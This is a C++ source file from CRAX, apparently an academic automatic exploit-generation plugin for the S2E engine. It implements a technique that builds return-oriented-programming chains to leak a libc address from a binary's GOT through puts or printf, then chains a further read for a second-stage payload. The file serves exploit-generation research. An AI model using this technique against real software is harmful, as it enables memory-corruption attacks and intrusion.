// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/Exploit.h>
#include <s2e/Plugins/CRAX/API/Disassembler.h>
#include <s2e/Plugins/CRAX/Pwnlib/Util.h>
#include <s2e/Plugins/CRAX/Techniques/Ret2csu.h>

#include <cassert>
#include <algorithm>
#include <vector>

#include "GotLeakLibc.h"

namespace s2e::plugins::crax {

GotLeakLibc::GotLeakLibc() : Technique() {
    const Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    m_requiredGadgets.push_back(std::make_pair(&elf, "pop rdi ; ret"));
}


bool GotLeakLibc::checkRequirements() const {
    //const auto &sym = g_crax->getExploit().getElf().symbols();

    // read() must be present in the GOT of the target binary.
    return Technique::checkRequirements();
}

void GotLeakLibc::resolveRequiredGadgets() {
    Technique::resolveRequiredGadgets();

    Exploit &exploit = g_crax->getExploit();
    exploit.registerSymbol("got_leak_libc_fmt_str", exploit.getElf().bss() + 0x600);
}

std::vector<RopPayload> GotLeakLibc::getRopPayloadList() const {
    Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();
    const ELF &libc = exploit.getLibc();

    std::vector<RopPayload> ret;
    std::string targetSym = getTargetSymbol();

    if (elf.hasSymbol("puts")) {
        ret = getRopPayloadListForPuts(targetSym);
    } else if (elf.hasSymbol("printf")) {
        ret = getRopPayloadListForPrintf(targetSym);
    }
    assert(ret.size() && "GotLeakLibc: no supported read primitive :(");

    ret.push_back({
        LambdaExpr::create([&exploit, &libc, targetSym]() {
            exploit.writeLeakLibcBase(libc.symbols().at(targetSym));
            exploit.writeline();
        })
    });

    return ret;
}


std::vector<RopPayload>
GotLeakLibc::getRopPayloadListForPuts(const std::string &targetSym) const {
    Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    auto ret2csu = g_crax->getTechnique<Ret2csu>();
    assert(ret2csu);

    RopPayload part1 = {
        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rdi ; ret")),
        BaseOffsetExpr::create<BaseType::GOT>(elf, targetSym),
        BaseOffsetExpr::create<BaseType::SYM>(elf, "puts")
    };

    uint64_t part2Size = ret2csu->estimateRopPayloadSize(/*arg1=*/0);
    uint64_t ropReadDstOffset
        = sizeof(uint64_t) * (part1.size() + part2Size);

    RopPayload part2;

    if (elf.hasSymbol("read")) {
        part2 = ret2csu->getRopPayloadList(
                BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
                ConstantExpr::create(0, Expr::Int64),
                PlaceholderExpr<uint64_t>::create(ropReadDstOffset),
                ConstantExpr::create(0x400, Expr::Int64))[0];

    } else if (elf.hasSymbol("gets")) {
        part2 = ret2csu->getRopPayloadList(
                BaseOffsetExpr::create<BaseType::SYM>(elf, "gets"),
                PlaceholderExpr<uint64_t>::create(ropReadDstOffset),
                ConstantExpr::create(0, Expr::Int64),
                ConstantExpr::create(0, Expr::Int64))[0];
    }


    RopPayload ret;

    ret.reserve(1 + part1.size() + part2.size());
    ret.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
    ret.insert(ret.end(), part1.begin(), part1.end());
    ret.insert(ret.end(), part2.begin(), part2.end());

    return { ret };
}

std::vector<RopPayload>
GotLeakLibc::getRopPayloadListForPrintf(const std::string &targetSym) const {
    Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    auto ret2csu = g_crax->getTechnique<Ret2csu>();
    assert(ret2csu);

    // Write "%s\n\x00" to somewhere in .bss, so that we can
    // leak 8 bytes from an entry of GOT with printf().
    // read(0, elf_base + got_leak_libc_fmt_str, 4)
    std::string fmtStr = "%s\n";
    fmtStr.push_back('\x00');

    RopPayload part1 = ret2csu->getRopPayloadList(
        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create<BaseType::VAR>(elf, "got_leak_libc_fmt_str"),
        ConstantExpr::create(fmtStr.size(), Expr::Int64))[0];

    // read(0, 0, 0), setting RAX to 0 and RDI to 1.
    RopPayload part2 = ret2csu->getRopPayloadList(
        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
        ConstantExpr::create(1, Expr::Int64),
        ConstantExpr::create(0, Expr::Int64),
        ConstantExpr::create(0, Expr::Int64))[0];

    // Set RSI to elf.got['read'], returning to `pop rdi ; ret`.
    RopPayload part3 = ret2csu->getRopPayloadList(
        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rdi ; ret")),
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create<BaseType::GOT>(elf, targetSym),
        ConstantExpr::create(0, Expr::Int64))[0];

    RopPayload part4 = {
        BaseOffsetExpr::create<BaseType::VAR>(elf, "got_leak_libc_fmt_str"),
        BaseOffsetExpr::create<BaseType::SYM>(elf, "printf")
    };

    // Prepare to chain the current payload with the next one by calling
    // read(0, ropReadDstOffset, 0x400).
    uint64_t part5Size = ret2csu->estimateRopPayloadSize(/*arg1=*/0);
    uint64_t ropReadDstOffset
        = sizeof(uint64_t) * (part1.size() + part2.size() + part3.size() + part4.size() + part5Size);

    RopPayload part5 = ret2csu->getRopPayloadList(
        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
        ConstantExpr::create(0, Expr::Int64),
        PlaceholderExpr<uint64_t>::create(ropReadDstOffset),
        ConstantExpr::create(0x400, Expr::Int64))[0];


    RopPayload ret1;
    RopPayload ret2 = { ByteVectorExpr::create(fmtStr) };

    ret1.reserve(1 + part1.size() + part2.size() + part3.size() + part4.size() + part5.size());
    ret1.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
    ret1.insert(ret1.end(), part1.begin(), part1.end());
    ret1.insert(ret1.end(), part2.begin(), part2.end());
    ret1.insert(ret1.end(), part3.begin(), part3.end());
    ret1.insert(ret1.end(), part4.begin(), part4.end());
    ret1.insert(ret1.end(), part5.begin(), part5.end());

    return { ret1, ret2 };
}


std::string GotLeakLibc::getTargetSymbol() const {
    Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();
    const ELF &libc = exploit.getLibc();

    const auto &vmmap = mem().vmmap();
    std::string ret;

    assert(elf.plt().size() && "PLT is empty ?_?");

    for (const auto &[sym, offset] : elf.got()) {
        uint64_t entryAddr = elf.getBase() + offset;
        uint64_t value = u64(mem().readConcrete(entryAddr, 8));

        if (vmmap.getModuleBaseAddress(value) == libc.getBase()) {
            ret = sym;
            break;
        }
    }

    assert(ret.size() && "No suitable candiate for leaking libc base from GOT?");
    return ret;
}

}  // namespace s2e::plugins::crax
